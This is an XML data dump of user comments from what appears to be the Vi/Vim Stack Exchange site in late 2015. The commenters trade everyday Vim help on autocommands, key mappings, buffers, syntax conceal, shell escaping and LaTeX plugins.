  <row Id="8734" PostId="5666" Score="2" Text="Not sure it will work but you could try the following three lines of code (the second one being indented) : `augroup FormatOnSave` (first line), `autocmd FileType c,cpp,objc :autocmd! FormatOnSave BufWritePost &lt;buffer&gt; :ClangFormat` (2nd line), `augroup END` (3rd line)." CreationDate="2015-11-30T22:33:21.413" UserId="4939" />
  <row Id="8735" PostId="5666" Score="0" Text="@garyjohn Nope, as you can see I tried the approach in the given post. I saw it before and tried the mentioned method." CreationDate="2015-11-30T22:41:54.017" UserId="5454" />
  <row Id="8736" PostId="5667" Score="0" Text="I don't know if it will work, but have you tried the `fnameescape()` function ? If I store &quot;&lt;Up&gt;&quot; inside the `g:some_key` variable then type : `echo fnameescape(g:some_key)`, the output is &quot;\&lt;Up&gt;&quot;." CreationDate="2015-11-30T22:43:19.560" UserId="4939" />
  <row Id="8737" PostId="5666" Score="0" Text="@saginaw *Works great!* Thank you so much for the quick response, but to be honest: I don't understand, what I just copied... It would be awesome if you could create this as a nice answer to the post, of course I'll flag it as solution. If you are more comfortable with an explaining comment, that's fine as well. I'm still unsure, why my approach didn't worked." CreationDate="2015-11-30T22:44:18.097" UserId="5454" />
  <row Id="8738" PostId="5666" Score="1" Text="@LastSecondsToLive I'm really glad it helped you! However, I'm not confident writing an answer on the topic because I don't know why my solution works whereas yours don't. To be honest, I had the same problem as you in the past and found the solution here : http://stackoverflow.com/a/5264606 Maybe the reason why your code didn't work is because of the order : first the filetype, then the event (not the reverse). But I'm not sure. I would prefer that someone else with more knowledge on the subject writes an answer. But if no one does, and if your question is not marked as a duplicate, I'll try." CreationDate="2015-11-30T22:52:04.637" UserId="4939" />
  <row Id="8739" PostId="5666" Score="0" Text="Ok, thank you again. You made my day. I'm fine with waiting a little for someone with advanced knowledge." CreationDate="2015-11-30T22:56:04.417" UserId="5454" />
  <row Id="8740" PostId="5667" Score="0" Text="Didn't think about that! It works in the specific case I asked about, but I forgot to mention that I also need it to work for function called using `&lt;C-R&gt;=&lt;SID&gt;SomeFunction()&lt;CR&gt;` in `imap` (and in this case `fnameescape()` doesn't work. Edited the question accordingly. Thank you for your help" CreationDate="2015-11-30T23:13:58.407" UserId="5479" />
  <row Id="8741" PostId="5666" Score="3" Text="The problem with the original command under `&quot; Format on save` is that the outer autocommand is not triggered until after your file is saved, and when it is triggered, it simply sets up another autocommand that will be triggered when the filetype is detected, but the filetype is detected soon after the file is loaded into the buffer. By the time you save the file, the FileType event has long passed. However, when the BufWritePost event occurs, the `filetype` option has been set, so you could test that its value is one of c, cpp, or objc." CreationDate="2015-12-01T00:47:32.143" UserId="2055" />
  <row Id="8742" PostId="5668" Score="4" Text="set the 'verbose' option to 5 before executing a shell command." CreationDate="2015-12-01T08:05:23.863" UserId="71" />
  <row Id="8743" PostId="5671" Score="4" Text="VimGolf: `:exe 'edit' SomeFunction()`" CreationDate="2015-12-01T08:05:55.927" UserId="71" />
  <row Id="8744" PostId="5658" Score="2" Text="You can, of course, map `h` to try to fold current section if cursor is at line start. But, IMHO, it is a little inconvenient to do so, because you have to have (or move) the cursor there in the first place. While the default key maps (`zc`, or `zC`) don't have that shortcoming." CreationDate="2015-12-01T12:43:35.677" UserId="1800" />
  <row Id="8745" PostId="5672" Score="1" Text="For buffers, but seems relevant to your intended usage: [using Unite buffer](http://vi.stackexchange.com/a/3202/1800)" CreationDate="2015-12-01T13:39:15.217" UserId="1800" />
  <row Id="8746" PostId="5674" Score="2" Text="This looks like, your vim starts in compatible mode. so try putting a `:set nocompatible` into your .vimrc." CreationDate="2015-12-01T16:26:14.367" UserId="71" />
  <row Id="8747" PostId="5675" Score="0" Text="[pandemic](https://github.com/jwcxz/vim-pandemic) adds the management of remote bundles on top of `pathogen` to make it more like `Vundle`" CreationDate="2015-12-01T16:32:03.917" UserId="182" />
  <row Id="8748" PostId="5675" Score="3" Text="Possible duplicate: [What is the difference between the vim package managers?](http://vi.stackexchange.com/q/388/1841)" CreationDate="2015-12-01T16:39:21.817" UserId="1841" />
  <row Id="8749" PostId="5674" Score="0" Text="Already tried that (forgot to write that) because I thought this might be it. Sadly it didn't help either." CreationDate="2015-12-01T17:33:27.860" UserId="5486" />
  <row Id="8750" PostId="5673" Score="1" Text="In case you do not want to use `:redir`, you can use something like `map(range(argc()), 'argv(v:val)')` to get the arglist as list." CreationDate="2015-12-01T17:41:02.320" UserId="778" />
  <row Id="8751" PostId="5675" Score="0" Text="@statox I had read that question before asking it here." CreationDate="2015-12-01T18:34:16.887" UserId="5087" />
  <row Id="8752" PostId="5674" Score="0" Text="perhaps you have a tiny vim installed? What is the output of `:version`" CreationDate="2015-12-01T19:09:10.143" UserId="71" />
  <row Id="8753" PostId="5676" Score="1" Text="Take a look at [sunifdef](http://sourceforge.net/projects/sunifdef/files/sunifdef/).  Not updated in almost 8 years, but the C preprocessor hasn't exactly seen active development since than, either.  It works pretty well in my experience." CreationDate="2015-12-01T20:35:49.950" UserId="2313" />
  <row Id="8754" PostId="5668" Score="0" Text="@ChristianBrabandt Thank you very much !" CreationDate="2015-12-01T21:36:00.657" UserId="4939" />
  <row Id="8755" PostId="5666" Score="0" Text="Thanks for the clarification." CreationDate="2015-12-01T21:56:41.093" UserId="5454" />
  <row Id="8756" PostId="5669" Score="0" Text="Hey, thanks for the answer, really informative. It helped me correct a good part of the current design of the script. But this approach still doesn't work for value returned by &lt;C-R&gt;= expression I have to call feedkeys(&quot;\&lt;Plug&gt;(some-key)&quot;) if I want it to work." CreationDate="2015-12-01T22:53:12.083" UserId="5479" />
  <row Id="8757" PostId="5669" Score="0" Text="@EnricoGhirardi Using `&lt;c-r&gt;=` is a bit more tricky however you can use `eval()` to create a properly quoted string. e.g. `eval('&quot;'.substitute(g:some_key, '&lt;', '\\&amp;', 'g').'&quot;')`. I usually avoid `eval()` (`feedkeys()` too), so use at your own risk. If you are able, I would suggest you use an `&lt;expr&gt;` mapping instead of `&lt;c-r&gt;=` for your `imap`'s." CreationDate="2015-12-02T01:07:08.650" UserId="778" />
  <row Id="8758" PostId="310" Score="0" Text="When I saw the &quot;this famous post&quot; link, I was *sure* it was to this one: http://stackoverflow.com/a/26710166/5419599  But it wasn't.  That (the one I just linked) was by far the most helpful post I have found anywhere for understanding the distinct purposes of buffers, tabs and windows." CreationDate="2015-12-02T02:51:36.223" UserId="4676" />
  <row Id="8759" PostId="5079" Score="0" Text="I think that your comparison of the impressions created by the two very different exposures to vi is a very valuable lesson.  I've thought of this many times since reading it...sticks in my mind.  Thank you." CreationDate="2015-12-02T06:36:17.607" UserId="4676" />
  <row Id="8760" PostId="5679" Score="0" Text="Thank you for your answer. Yes I agree my example was poorly chosen. There's a very good reason why I used it though (for testing and understanding a few things). But in fact the errors I come across are given by other more complex shell commands that I still haven't understood. For example, I would like to populate a local arglist with the output of a shell command (a `find` command with a wildcard). It should be possible. There are even examples given in the help (`:help backtick-expansion`), but on my system they don't work. I've got the error `E79`." CreationDate="2015-12-02T06:40:03.143" UserId="4939" />
  <row Id="8761" PostId="5679" Score="0" Text="I need to see what it sends exactly to understand where the problem comes from. I hope the answer of Christian Brabandt will help me. I didn't want to use this more complex shell command as an example because this is a separate problem, I will open a new topic for it if I can't find an answer on my own. Thank you again for your answer, I didn't know the `:S` filename modifier, I'll use it from now on." CreationDate="2015-12-02T06:40:09.013" UserId="4939" />
  <row Id="8762" PostId="5679" Score="0" Text="Well, in fact, you are completely right, my problem doesn't come from the shell but from vim itself. `E79` is not a shell error, sorry I made another mistake." CreationDate="2015-12-02T06:46:36.570" UserId="4939" />
  <row Id="8763" PostId="3174" Score="0" Text="@ChristianBrabandt, It still creates problems. I removed the folds at all. I wish that the patch 7.4.700 was not included." CreationDate="2015-12-02T07:24:34.397" UserId="4646" />
  <row Id="8764" PostId="5674" Score="0" Text="`vim --version` says: `VIM - Vi IMproved 7.3 Included patches: 1-547`. The `vim-tiny` package was installed though, but the main big package was installed as well. I uninstalled `vim-tiny` but that didn't help either." CreationDate="2015-12-02T09:19:50.963" UserId="5486" />
  <row Id="8765" PostId="5680" Score="3" Text="Other than using `set number relativenumber` ?" CreationDate="2015-12-02T10:11:35.340" UserId="1800" />
  <row Id="8766" PostId="5682" Score="4" Text="Brilliant... this will *significantly* speed up things for me. I also notice that I no longer ask &quot;*can* this be done&quot;, but only &quot;*how* to do it&quot;. Seems I've finally &quot;arrived&quot; at Vim. :-D" CreationDate="2015-12-02T11:03:04.107" UserId="1726" />
  <row Id="8767" PostId="5680" Score="0" Text="That shows me only the relativenumber, not the absolute one." CreationDate="2015-12-02T11:34:36.627" UserId="650" />
  <row Id="8768" PostId="5680" Score="1" Text="On a different machine, it shows me the only the absolute number of the current line, and all the relative numbers.  I want them both at the same time" CreationDate="2015-12-02T11:36:00.120" UserId="650" />
  <row Id="8769" PostId="5680" Score="0" Text="I think the OP wants the option to show relative numbers and and absolute numbers in the number column at the same time. AFAIK, that isn't possible." CreationDate="2015-12-02T12:29:12.933" UserId="865" />
  <row Id="8770" PostId="5683" Score="4" Text="[Vimcasts](http://vimcasts.org/) episode: [Supercharged substitution with :Subvert](http://vimcasts.org/episodes/supercharged-substitution-with-subvert/)" CreationDate="2015-12-02T15:22:38.977" UserId="778" />
  <row Id="8771" PostId="5681" Score="1" Text="Note about the &quot;selectively&quot; for those who don't know it: Just add `c` to the end of the substitution statements below, and Vim will ask you about every single match." CreationDate="2015-12-02T15:28:22.213" UserId="1726" />
  <row Id="8772" PostId="3157" Score="0" Text="As for readability, I prefer (and suggest) `:%s@/home/martin/test@/home/jake/x@`, as the &quot;fat&quot; `@` makes it even easier to see where the individual parts of the statement begin / end." CreationDate="2015-12-02T15:32:36.187" UserId="1726" />
  <row Id="8773" PostId="5685" Score="7" Text="Just because you don't use any `g` mappings now, does not mean you wont use any in the future. There are some rather handy ones in there. e.g. `gE`, `g_`, `gt`, `gT`, `g,`, `g;`, `gu`, `gU`, `gn`, and my personally favorite `gf`. See `:h g` for a list of all g mappings." CreationDate="2015-12-02T16:12:31.760" UserId="778" />
  <row Id="8774" PostId="5685" Score="0" Text="Oh yes, gf is awesome. But I don't need it that often right now. Maybe I'll move it to a separate hotkey when I'll need it. (Our names are so hilariously simular, I wonder if I looked at yours when I was choosing mine)." CreationDate="2015-12-02T16:42:18.323" UserId="5365" />
  <row Id="8775" PostId="5685" Score="0" Text="And I want vim and less to behave the same, if possible. Less uses a single `g`." CreationDate="2015-12-02T16:44:36.143" UserId="5365" />
  <row Id="8776" PostId="5685" Score="3" Text="I probably use `gv` about every 90 seconds or so" CreationDate="2015-12-02T17:17:07.447" UserId="4603" />
  <row Id="8777" PostId="5675" Score="0" Text="@KshitijSaraogi: Then you should be more precise about what you didn't understand in what you read and which complementary information you need. Here both of the questions you asked are already answered somewhere else (you might want to read [this answer](http://vi.stackexchange.com/a/614/1841) to understand why you need a plugin manager)." CreationDate="2015-12-02T17:26:24.933" UserId="1841" />
  <row Id="8778" PostId="5685" Score="1" Text="There are also some plugins whose default mappings starts with g, such as `gc` in [commentary](https://github.com/tpope/vim-commentary). You should also consider that [you will](http://stackoverflow.com/questions/16359878/) run [out of keys](https://groups.google.com/forum/#!topic/vim_dev/2bp9UdfZ63M%5B1-25%5D) if you continue using Vim for a long time, and that it takes some time/effort to train your muscle memory after you get used to a given mapping." CreationDate="2015-12-02T18:34:32.327" UserId="1405" />
  <row Id="8779" PostId="5685" Score="0" Text="@mMontu I already did run out. I don't think it's such a bad thing, my vim is already 50 times more powerful than notepad, while being only 5 times more complex. I'm fine with that." CreationDate="2015-12-02T19:03:15.007" UserId="5365" />
  <row Id="8780" PostId="5674" Score="0" Text="check the version output, which flavor (tiny, big, huge) is running when you start vim" CreationDate="2015-12-02T19:17:24.323" UserId="71" />
  <row Id="8783" PostId="5695" Score="1" Text="That's actually a really good idea, thank you!" CreationDate="2015-12-02T20:38:46.183" UserId="5365" />
  <row Id="8784" PostId="5693" Score="0" Text="Not sure if I have a plugin that is interfering or not. But it's just returning the same info if I did plain `pwd`. I just ended up creating a global variable store the first opened file. `let g:projectDir = get(g:, 'projectDir', expand('%:p:h'))`" CreationDate="2015-12-02T20:54:43.060" UserId="5498" />
  <row Id="8785" PostId="5690" Score="7" Text="`gi` is also pretty fantastic (enter insert mode where you previously left it). I use it all the time when I'm in the middle of typing a line of code and I have to go check something elsewhere in the file." CreationDate="2015-12-02T20:58:53.743" UserId="88" />
  <row Id="8786" PostId="5695" Score="0" Text="You're welcome :)" CreationDate="2015-12-02T22:06:56.460" UserId="1800" />
  <row Id="8787" PostId="5696" Score="2" Text="Does it change anything if you type `:syn match haxeTypeDecl /package/ conceal containedin=ALL cchar=p` instead of `:syn match haxeTypeDecl /package/ conceal cchar=p` (basically just adding the `containedin=ALL` argument) ?" CreationDate="2015-12-03T00:54:55.373" UserId="4939" />
  <row Id="8788" PostId="5690" Score="0" Text="Yep. This is like people who map `w` to `:w&lt;CR&gt;` and `q` to `:qall&lt;CR&gt;` because it's &quot;faster.&quot; You're just robbing yourself of the benefits of vim." CreationDate="2015-12-03T01:32:03.357" UserId="142" />
  <row Id="8789" PostId="5696" Score="0" Text="No, not besides the having the tag in the &quot;:syn&quot; menu." CreationDate="2015-12-03T03:20:57.253" UserId="5502" />
  <row Id="8790" PostId="5363" Score="1" Text="The ability to feed text through external tools is why I usually recommend Vim *and* Cygwin on Windows. Vim and shell simply *belong* together." CreationDate="2015-12-03T10:33:26.207" UserId="1726" />
  <row Id="8791" PostId="5690" Score="0" Text="@WChargin oh, so I'm not the first one. Do you know more about this kind of remaps, can you redirect me to those people?" CreationDate="2015-12-03T12:22:39.947" UserId="5365" />
  <row Id="8792" PostId="5685" Score="0" Text="@PeretFinctor: But by using up keys, and thus blocking out the more powerful features of Vim, you stop yourself from being 50 times more powerful *tomorrow* than you are *today*. (And let's be honest, &quot;fifty times more than Notepad&quot; is still damn close to zero...)" CreationDate="2015-12-03T13:14:08.973" UserId="1726" />
  <row Id="8793" PostId="5703" Score="0" Text="do you know the buffer names?" CreationDate="2015-12-03T15:45:17.440" UserId="71" />
  <row Id="8794" PostId="5703" Score="0" Text="You almost certainly used `:grep` or some other command that created unlisted buffers for every matching file." CreationDate="2015-12-03T15:45:20.730" UserId="54" />
  <row Id="8795" PostId="5703" Score="0" Text="Those `(...)` are real, valid file names that I have opened. Those are fine. I have truncated file names as this is my work computer. I am confuseb by the gaps between them." CreationDate="2015-12-03T15:49:39.467" UserId="5512" />
  <row Id="8796" PostId="5703" Score="0" Text="And if you look at unlisted buffers, with `:ls!` ?" CreationDate="2015-12-03T16:21:17.933" UserId="5516" />
  <row Id="8797" PostId="5703" Score="0" Text="Not to be snarky, but does it matter?" CreationDate="2015-12-03T16:56:27.207" UserId="778" />
  <row Id="8798" PostId="5712" Score="0" Text="Well I know that, but I was just wondering if this is a good complete list of options or if there are other suggestions to this." CreationDate="2015-12-03T17:10:49.943" UserId="1065" />
  <row Id="8799" PostId="5712" Score="1" Text="But that's not what you asked." CreationDate="2015-12-03T17:24:10.127" UserId="54" />
  <row Id="8800" PostId="5690" Score="0" Text="@PeretFinctor Not sure whether you're joking—my point is that these kinds of remaps are very bad ideas. People who do this are just trying to use vim as a run-of-the-mill editor; `w`, `q`, and `g` all offer extremely extensive functionality that you should be using frequently while editing, but which you are suppressing to shave off fractions of a second when you save. I don't know about you, but I save much less frequently than I move forward a word!" CreationDate="2015-12-03T19:33:55.670" UserId="142" />
  <row Id="8801" PostId="5698" Score="0" Text="This works, thank you, another quick question, is there an easy way to to conceal with multiple characters? For example if I wanted &quot;package&quot; to become &quot;pa&quot;, it seems to only use the first character." CreationDate="2015-12-03T19:49:23.280" UserId="5502" />
  <row Id="8802" PostId="5703" Score="0" Text="It's easier to switch buffers using numbers 1..20something than three-digit arbitrary." CreationDate="2015-12-03T20:40:05.097" UserId="5512" />
  <row Id="8803" PostId="5703" Score="1" Text="It's even easier to switch by partial name." CreationDate="2015-12-03T22:01:47.040" UserId="54" />
  <row Id="8804" PostId="5546" Score="0" Text="@ChristianBrabandt: Found the culprit, see my answer for more details. I wonder is that behavior documented else where in vim documentation." CreationDate="2015-12-04T06:29:26.493" UserId="1892" />
  <row Id="8805" PostId="5698" Score="0" Text="I don't think this is possible. You could possibly work around that by matching 'pack\zeage' and 'pack\zsage' and use different conceal chars." CreationDate="2015-12-04T07:17:28.933" UserId="71" />
  <row Id="8806" PostId="5546" Score="0" Text="great for finding the solution. So it's not a vim bug." CreationDate="2015-12-04T07:18:40.390" UserId="71" />
  <row Id="8807" PostId="5546" Score="0" Text="@ChristianBrabandt: Would you mind explaining how `vim` handle the event name and the augroup name? In user perspective, I think it's common to a user set an augroup name duplicated with vim builtin event name like this issue. I find information in the doc but got no luck." CreationDate="2015-12-04T07:22:25.127" UserId="1892" />
  <row Id="8808" PostId="5703" Score="0" Text="Well, if you have opened those files once in your current vim session, than that explains your issue. You could `bdelete` unused buffers, but buffer numbers will never be reused and always increase. There is nothing you can do about except perhaps for a restart of your vim." CreationDate="2015-12-04T07:23:40.080" UserId="71" />
  <row Id="8809" PostId="5546" Score="1" Text="sorry, i can't explain this issue. Perhaps Vim should warn in a case like yours." CreationDate="2015-12-04T07:26:11.527" UserId="71" />
  <row Id="8810" PostId="5690" Score="0" Text="@WChargin I remapped macros related functions to a and A, and I use e and r to move a word back and a word forward." CreationDate="2015-12-04T09:01:42.237" UserId="5365" />
  <row Id="8811" PostId="5685" Score="0" Text="@DevSolar If you care about me being powerful, can you recommend me a text editor whose source code I can understand? And one having a good enough scripting facilities to control cursor movement and everything else from script?" CreationDate="2015-12-04T09:05:22.297" UserId="5365" />
  <row Id="8812" PostId="5685" Score="0" Text="@PeretFinctor: Vim? Seriously, I don't know any better (and I have used *many* over the last three decades). However, I don't see why you need to &quot;understand the source&quot; to *use* an editor. Vim certainly has the scripting / macro facilites." CreationDate="2015-12-04T09:38:56.797" UserId="1726" />
  <row Id="8813" PostId="5690" Score="1" Text="@PeretFinctor: Why don't you use w / W and b / B for word-forward and word-backward, the way Vim provides out-of-the-box? -- You see the pattern here? You try to *wrestle* with Vim. Move *with* it, use the things it provides *as* they are provided. It *will* be easier that way, and more beneficial for your workflow in the long run." CreationDate="2015-12-04T09:43:01.253" UserId="1726" />
  <row Id="8814" PostId="5685" Score="0" Text="@DevSolar Well, don't you think it's dumb to have a source code, but never look inside? And never being able to change anything because you can't find anything ever? I'm afraid that vim is too complex for me to ever understand, maybe if I'll find something simplier..." CreationDate="2015-12-04T09:49:09.103" UserId="5365" />
  <row Id="8815" PostId="5690" Score="0" Text="@DevSolar Because e and r are right next to each other... I'm writing my own text editor, I'm learning vim just to see if I'm missing something good." CreationDate="2015-12-04T09:51:56.097" UserId="5365" />
  <row Id="8816" PostId="5685" Score="0" Text="@PeretFinctor: I have *megabytes* of source code that I use daily but would would not *dream* (in my worst nightmares) of looking into. I've been working as C++ maintenance coder for the last 15 years, and I just *know* how much work it is to effectively improve some source without actually being fully engaged in the project. *Especially* with a fully developed and track-proven code base like Vim. Vim might *look* like an &quot;easy&quot; or &quot;lightweight&quot; editor, and in some ways it might even *be* one... but it is also easily one of the most feature-rich editors available, i.e. complex." CreationDate="2015-12-04T10:09:40.333" UserId="1726" />
  <row Id="8817" PostId="5690" Score="0" Text="@PeretFinctor: Well, &quot;**w**ord&quot; and &quot;**b**ack&quot; are not bad either since they are mnemonic. And I wouldn't want to toss away &quot;**e**nd&quot; and &quot;**r**eplace&quot; just so that two (of three...) word skipping keys are next to each other. ;-)" CreationDate="2015-12-04T10:12:29.717" UserId="1726" />
  <row Id="8818" PostId="5685" Score="0" Text="@Yeah, just one look at the manual is enough to see that it's not at all simple. Hm, maybe I should look inside nano..." CreationDate="2015-12-04T11:58:06.760" UserId="5365" />
  <row Id="8819" PostId="5690" Score="0" Text="@DevSolar Dunno, having two (four?) keys for moving a word forward is weird. I left only one. Now I have one command to move to the end of this or next word, and one to move to the beginning of this or previous word. If I want to select a word, I just &lt;End&gt;&lt;Select&gt;&lt;Beginning&gt;&lt;Copy&gt;." CreationDate="2015-12-04T12:14:27.303" UserId="5365" />
  <row Id="8821" PostId="5685" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/32509/discussion-between-devsolar-and-peret-finctor)." CreationDate="2015-12-04T12:49:45.180" UserId="1726" />
  <row Id="8822" PostId="5693" Score="0" Text="When Vim runs an external command, either through `:!` or `system()`, it uses the working directory that was set via `:cd` or `:lcd`, so this won't work." CreationDate="2015-12-04T13:35:25.903" UserId="15" />
  <row Id="8823" PostId="5679" Score="1" Text="@saginaw The `:S` modifier is a relatively recent addition to Vim, so depending on your portability requirements, it may be safer to stick with `:exe` and `shellescape()`." CreationDate="2015-12-04T13:38:46.493" UserId="15" />
  <row Id="8824" PostId="5679" Score="0" Text="@jamessan I didn't know that, thank you. Besides, `shellescape()` (for shell arguments) and `fnamescape()` (for vim commands arguments) stick together better in my memory than `:S` and `fnameescape()`." CreationDate="2015-12-04T13:51:18.673" UserId="4939" />
  <row Id="8825" PostId="5674" Score="0" Text="I don't know how to check the flavor. Executing `:version` I get: http://pastebin.com/JyssupUE  (cannot copy &amp; paste the output in the comment field)" CreationDate="2015-12-04T17:00:18.660" UserId="5486" />
  <row Id="8826" PostId="5718" Score="1" Text="What happens if you add `$` to the `iskeyword` option (for `sh` files) ?" CreationDate="2015-12-04T17:52:51.413" UserId="1800" />
  <row Id="8827" PostId="5690" Score="0" Text="Err, I just istalled version 7.4.960 from git (sorry for delay), and here `nnoremap &lt;nowait&gt; g gg` doesn't execute gg instantaniously. it still waits. Can somebody else test it?" CreationDate="2015-12-04T18:37:15.543" UserId="5365" />
  <row Id="8829" PostId="5703" Score="0" Text="I didn't open 881 files..." CreationDate="2015-12-04T19:19:18.983" UserId="5512" />
  <row Id="8830" PostId="5690" Score="0" Text="Ok, found what it was by `:verbose map g`, disabled with `let g:netrw_nogx=11111`. New trashy hotkey was defined after the processing of .vimrc was done, setting this variable to anything fixes this." CreationDate="2015-12-04T19:50:54.717" UserId="5365" />
  <row Id="8831" PostId="5674" Score="0" Text="its a huge version and it expects its vimrc at ~/.vimrc. I am out of ideas now." CreationDate="2015-12-04T20:41:32.937" UserId="71" />
  <row Id="8832" PostId="5722" Score="0" Text="Ah, thanks. I have to admit i haven't read the help page carefully enough..&#xA;However, that doesn't touches the problem that my settings are (at least just half of it) recognized. Should i ask that one spererately?" CreationDate="2015-12-04T21:25:59.573" UserId="2354" />
  <row Id="8833" PostId="5723" Score="0" Text="The simple answer:  they are the same." CreationDate="2015-12-05T00:28:20.367" UserId="3002" />
  <row Id="8834" PostId="5719" Score="0" Text="Cool (+1) -- vim is always surprising." CreationDate="2015-12-05T00:45:09.667" UserId="3002" />
  <row Id="8835" PostId="5723" Score="1" Text="They are *not* the same.  I don't know the difference exactly, but it is something about writing vs. not writing to the file if no changes have been made (i.e. updating the timestamp)." CreationDate="2015-12-05T01:26:13.997" UserId="4676" />
  <row Id="8838" PostId="5724" Score="0" Text="Also see `:help g]` (which searches the ctags database) to get a list of files where this function is defined/declared." CreationDate="2015-12-05T06:21:29.763" UserId="246" />
  <row Id="8839" PostId="5727" Score="2" Text="The usual means is `:verbose set ...?`, e.g., `:verbose set cmdheight?`. That will tell you where `'cmdheight'` was last set. I have no explanation for how the command line height could be several lines while `'cmdheight'` is 1." CreationDate="2015-12-05T07:14:18.143" UserId="2055" />
  <row Id="8840" PostId="5727" Score="0" Text="Thank you very much ! I think it comes from a plugin (specifically from this file: https://github.com/haya14busa/incsearch.vim/blob/5b79457f04c5afd12a06b10765f752550c066c01/autoload/vital/_incsearch/Over/Commandline/Modules/Redraw.vim). If you post your answer, I'll accept it. Anyway, thanks, it will help me find a solution." CreationDate="2015-12-05T07:28:11.557" UserId="4939" />
  <row Id="8841" PostId="5729" Score="1" Text="AFAIK, it's a Vim *internal* command - it looks like 'more', but the program is not called by Vim (proof: it works in Windows, too). You can still write the beginning of a variable name, than ask Vim to complete it (e.g. with `Ctrl-d`)." CreationDate="2015-12-05T08:30:10.807" UserId="1800" />
  <row Id="8842" PostId="5729" Score="0" Text="thanks, when I type the variable name - or in fact pretty much anything - vim wont accept it - it just prompts with `-- More -- SPACE/d/j: screen/page/line down, b/u/k: up, q: quit` in the commandline." CreationDate="2015-12-05T08:34:52.577" UserId="4603" />
  <row Id="8843" PostId="5729" Score="1" Text="Write `:let ` then don't hit `Enter`, but `Tab` or `Ctrl-d` - you'll have a list of existing variables, displayed in &quot;more&quot; style - now hit `Esc`, write a few letters, hit `Tab` or `Ctrl-d` again ... and so on until you find the variable you want. Actually, to see the value of a variable, perhaps you should use `echo ` instead? (Or `set variable-name?` for options)" CreationDate="2015-12-05T08:43:58.050" UserId="1800" />
  <row Id="8844" PostId="5723" Score="0" Text="Also, from a *practical* point of view, `ZZ` (or `ZQ`) is shorter and easier to type ..." CreationDate="2015-12-05T08:45:37.680" UserId="1800" />
  <row Id="8845" PostId="5729" Score="1" Text="very cool, both the `Ctrl-d` and the echo trick worked nicely, thanks!" CreationDate="2015-12-05T09:03:35.713" UserId="4603" />
  <row Id="8846" PostId="5730" Score="0" Text="oh very cool, thats a great command to know! thanks" CreationDate="2015-12-05T09:09:51.227" UserId="4603" />
  <row Id="8847" PostId="5730" Score="2" Text="slightly simpler: `:redir @b|sil let|redir end`" CreationDate="2015-12-05T12:38:06.977" UserId="71" />
  <row Id="8848" PostId="5731" Score="0" Text="+1, wait for bounty from me!" CreationDate="2015-12-05T12:55:31.503" UserId="1892" />
  <row Id="8849" PostId="5732" Score="0" Text="Can you provide more information? *Why* doesn't it work? Do you have ctags installed? What error message do you get, if any, when you try using `Ctrl-]` on a word?" CreationDate="2015-12-05T22:23:33.870" UserId="246" />
  <row Id="8850" PostId="5732" Score="1" Text="I just managed to figure it out! The problem was because I used an keyboard layout that requires `^]` to be entered using `Ctrl-AltGr-9` which does not work within Vim. I answered my own question with this information." CreationDate="2015-12-05T22:59:16.097" UserId="3032" />
  <row Id="8851" PostId="5720" Score="0" Text="sorry about that, fixed now" CreationDate="2015-12-06T02:23:17.637" UserId="5526" />
  <row Id="8852" PostId="5732" Score="1" Text="FWIW, `&lt;C-]&gt;` on an AZERTY Mac keyboard is obtained by pressing `&lt;C-$&gt;`, `$` being in the same physical location as `]` on QWERTY keyboards." CreationDate="2015-12-06T09:20:18.807" UserId="54" />
  <row Id="8854" PostId="5733" Score="1" Text="This is no solution, this is surrender." CreationDate="2015-12-06T12:32:23.797" UserId="1041" />
  <row Id="8855" PostId="5732" Score="0" Text="I remember a solution which involved using MS Keyboard Layout Creator to &quot;inject&quot; the key combination (i.e. the OS didn't generate a key code at all when `Ctrl-]` was pressed. Or was it for `Ctrl-[` ?)" CreationDate="2015-12-06T12:37:31.463" UserId="1800" />
  <row Id="8856" PostId="5732" Score="1" Text="@romainl: thanks for mentioning this. Reminded me of my own question I asked on SO on this topic. Answered by... you :-)" CreationDate="2015-12-06T12:48:22.160" UserId="1041" />
  <row Id="8858" PostId="5735" Score="0" Text="I use vim-latex (gvim) on windows 10 and it doesn't prompt me to press enter after compilation with `\ll` or viewing with `\lv`, if you mean that you have to press enter after the compilation is finished to go back on writing. Or do you mean something else?" CreationDate="2015-12-06T16:18:57.693" UserId="602" />
  <row Id="8859" PostId="5735" Score="2" Text="I don't know the answer, but i want to pitch in that there are alternatives to LaTeX-Suite, e.g. LatexBox and vimtex. I'm the developer of vimtex, and in my humble opinion, it is a much more modern approach to a LaTeX plugin for vim." CreationDate="2015-12-06T18:19:36.377" UserId="21" />
  <row Id="8860" PostId="5735" Score="0" Text="Yes, after `\ll` or `\lv` I see `Press ENTER or type command to continue` in my command prompt. I have to press enter to get out of the command line and back into vim. I'm using Vim 7.3 in OSX El Capitan. When you compile with `\ll` does the long-winded output of the compiler show up in your command line? That's the main thing I want to get rid of , but the pressing enter thing would be nice too." CreationDate="2015-12-06T18:22:39.410" UserId="5043" />
  <row Id="8861" PostId="5735" Score="2" Text="@KarlYngveLervåg it would be nice to have vimtex compared to the other available plugins by someone like you who knows them best. Did you see [this question](http://vi.stackexchange.com/q/2047/602)?" CreationDate="2015-12-06T22:54:11.360" UserId="602" />
  <row Id="8862" PostId="5735" Score="1" Text="@glS Thanks, I didn't see that one. I just added some information [about vimtex](http://vi.stackexchange.com/a/5747/21). I hope it is useful." CreationDate="2015-12-07T07:15:00.577" UserId="21" />
  <row Id="8863" PostId="5743" Score="1" Text="You prefer the `plaintex` colorscheme? That's odd. Anyway, I think you are interested in the option `g:tex_flavor` (see `:h g:tex_flavor`). I.e., you will probably want to add `let g:tex_flavor = 'plain'` to your vimrc file." CreationDate="2015-12-07T07:24:03.823" UserId="21" />
  <row Id="8864" PostId="5722" Score="0" Text="@toogley all of your settings should be loaded if they are placed on your init file *without* the `g:indentLine_loaded` (similar to your first example, with **no** autocmds). You can check that by echoing the variables (e.g.: `:echo g:indentLine_fileType`). If the variables are set indeed, but the plugin still doesn't work as you expected then you should read its documentation more carefully, and maybe [ask on the issue tracker](https://github.com/Yggdroot/indentLine/issues)." CreationDate="2015-12-07T10:51:31.043" UserId="1405" />
  <row Id="8865" PostId="5746" Score="1" Text="Perhaps (also) check the other way around: if it *is* a help file, remove the match. I think a help file is &quot;visited&quot; twice by Vim: first the file is opened, then a tag jump takes place, which would account for a 2nd &quot;visit&quot;. At least, as far as I know, some autocmds get executed twice for help buffers." CreationDate="2015-12-07T11:38:01.990" UserId="1800" />
  <row Id="8866" PostId="5718" Score="0" Text="Thanks for the tip, but doesn't work.  I used `set iskeyword=@,$` with a shell file open and there was no difference in the `easy-align` results - still space on either side.  Same spacey thing with `=` signs and other characters used." CreationDate="2015-12-07T14:46:21.040" UserId="2303" />
